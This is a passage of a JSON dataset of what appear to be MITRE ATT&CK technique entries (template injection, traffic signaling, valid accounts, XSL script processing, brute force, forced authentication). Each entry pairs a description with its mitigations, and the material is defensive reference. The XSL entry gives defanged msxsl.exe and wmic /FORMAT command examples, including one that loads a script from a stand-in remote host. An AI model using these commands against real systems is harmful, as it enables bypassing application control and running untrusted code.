              "type": "text",
              "content": "Many native binaries may not be necessary within a given environment."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network."
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using using trusted binaries to bypass application control."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1216",
    "name": "System Script Proxy Execution",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [{ "id": "T1216.001", "name": "PubPrn" }],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1221",
    "name": "Template Injection",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered."
        }
      ],
      [
        {
          "type": "text",
          "content": "Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit."
        }
      ],
      [
        { "type": "text", "content": "Adversaries may also modify the " },
        { "type": "code", "content": "*\\template" },
        {
          "type": "text",
          "content": " control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload."
        }
      ],
      [
        {
          "type": "text",
          "content": "This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "Antivirus/Antimalware",
        "description": [
          [
            {
              "type": "text",
              "content": "Network/Host intrusion prevention systems, antivirus, and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider disabling Microsoft Office macros/active content to prevent the execution of malicious payloads in documents , though this setting may not mitigate the Forced Authentication use for this technique."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network/Host intrusion prevention systems, antivirus, and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users to identify social engineering techniques and spearphishing emails that could be used to deliver malicious documents."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205",
    "name": "Traffic Signaling",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0011", "name": "Command and Control" }
    ],
    "subs": [
      { "id": "T1205.001", "name": "Port Knocking" },
      { "id": "T1205.002", "name": "Socket Filters" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s)."
        }
      ],
      [
        {
          "type": "text",
          "content": "The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Wake-on-LAN if it is not needed within an environment."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1127",
    "name": "Trusted Developer Utilities Proxy Execution",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [{ "id": "T1127.001", "name": "MSBuild" }],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Specific developer utilities may not be necessary within a given environment and should be removed if not used."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Certain developer utilities should be blocked or restricted if not required."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1535",
    "name": "Unused/Unsupported Cloud Regions",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure."
        }
      ],
      [
        {
          "type": "text",
          "content": "Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected."
        }
      ],
      [
        {
          "type": "text",
          "content": "A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity."
        }
      ],
      [
        {
          "type": "text",
          "content": "An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Cloud service providers may allow customers to deactivate unused regions."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550",
    "name": "Use Alternate Authentication Material",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0008", "name": "Lateral Movement" }
    ],
    "subs": [
      { "id": "T1550.001", "name": "Application Access Token" },
      { "id": "T1550.002", "name": "Pass the Hash" },
      { "id": "T1550.003", "name": "Pass the Ticket" },
      { "id": "T1550.004", "name": "Web Session Cookie" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process."
        }
      ],
      [
        {
          "type": "text",
          "content": "Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least-privilege. Do not allow a domain user to be in the local administrator group on multiple systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078",
    "name": "Valid Accounts",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [
      { "id": "T1078.001", "name": "Default Accounts" },
      { "id": "T1078.002", "name": "Domain Accounts" },
      { "id": "T1078.003", "name": "Local Accounts" },
      { "id": "T1078.004", "name": "Cloud Accounts" }
    ],
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence."
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account."
        }
      ],
      [
        {
          "type": "text",
          "content": "The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "Account Use Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges."
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."
            }
          ]
        ]
      },
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured."
            }
          ],
          [
            {
              "type": "text",
              "content": "Policies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1497",
    "name": "Virtualization/Sandbox Evasion",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0007", "name": "Discovery" }
    ],
    "subs": [
      { "id": "T1497.001", "name": "System Checks" },
      { "id": "T1497.002", "name": "User Activity Based Checks" },
      { "id": "T1497.003", "name": "Time Based Evasion" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1600",
    "name": "Weaken Encryption",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1600.001", "name": "Reduce Key Space" },
      { "id": "T1600.002", "name": "Disable Crypto Hardware" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as Modify System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1220",
    "name": "XSL Script Processing",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension."
        }
      ],
      [{ "type": "text", "content": "Command-line examples:" }],
      [
        { "type": "li", "content": "msxsl.exe customers[.]xml script[.]xsl" },
        { "type": "li", "content": "msxsl.exe script[.]xsl script[.]xsl" },
        { "type": "li", "content": "msxsl.exe script[.]jpeg script[.]jpeg" }
      ],
      [
        {
          "type": "text",
          "content": "Another variation of this technique, dubbed \"Squiblytwo\", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch."
        }
      ],
      [{ "type": "text", "content": "Command-line examples:" }],
      [
        {
          "type": "li",
          "content": "Local File: wmic process list /FORMAT:evil[.]xsl"
        },
        {
          "type": "li",
          "content": "Remote File: wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\""
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557",
    "name": "Adversary-in-the-Middle",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0009", "name": "Collection" }
    ],
    "subs": [
      { "id": "T1557.001", "name": "LLMNR/NBT-NS Poisoning and SMB Relay" },
      { "id": "T1557.002", "name": "ARP Cache Poisoning" },
      { "id": "T1557.003", "name": "DHCP Spoofing" }
    ],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies. Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable legacy network protocols that may be used   to intercept network traffic if applicable, especially those that are not needed within an environment."
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Use network appliances and host-based security software to block network traffic that is not necessary within the environment, such as legacy protocols that may be leveraged for AiTM conditions."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit access to network infrastructure and resources that can be used to reshape traffic or otherwise produce AiTM conditions."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1110",
    "name": "Brute Force",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [
      { "id": "T1110.001", "name": "Password Guessing" },
      { "id": "T1110.002", "name": "Password Cracking" },
      { "id": "T1110.003", "name": "Password Spraying" },
      { "id": "T1110.004", "name": "Credential Stuffing" }
    ],
    "version": "2.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes."
        }
      ],
      [
        {
          "type": "text",
          "content": "Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "Account Use Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Refer to NIST guidelines when creating password policies."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1555",
    "name": "Credentials from Password Stores",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [
      { "id": "T1555.001", "name": "Keychain" },
      { "id": "T1555.002", "name": "Securityd Memory" },
      { "id": "T1555.003", "name": "Credentials from Web Browsers" },
      { "id": "T1555.004", "name": "Windows Credential Manager" },
      { "id": "T1555.005", "name": "Password Managers" },
      { "id": "T1555.006", "name": "Cloud Secrets Management Stores" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password."
            }
          ],
          [
            {
              "type": "text",
              "content": "Organizations may consider weighing the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the number of accounts and services with permission to query information from password stores to only those required. Ensure that accounts and services with permissions to query password stores only have access to the secrets they require."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1212",
    "name": "Exploitation for Credential Access",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is "
        },
        { "type": "code", "content": "MS14-068" },
        {
          "type": "text",
          "content": ", which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges."
        }
      ],
      [
        {
          "type": "text",
          "content": "Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal."
        }
      ],
      [
        {
          "type": "text",
          "content": "Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Application developers should consider taking measures to validate authentication requests by enabling one-time passwords, providing timestamps or sequence numbers for messages sent, using digital signatures, and/or using random session keys."
            }
          ]
        ]
      },
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist."
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion."
            }
          ]
        ]
      },
      {
        "id": "M1019",
        "name": "Threat Intelligence Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly by employing patch management for internal enterprise endpoints and servers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1187",
    "name": "Forced Authentication",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept."
        }
      ],
      [
        {
          "type": "text",
          "content": "The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources."
        }
      ],
      [
        {
          "type": "text",
          "content": "Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.  With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials. "
        }
      ],
      [
        {
          "type": "text",
          "content": "There are several different ways this can occur.  Some specifics from in-the-wild use include:"
        }
      ],
      [
        {
          "type": "li",
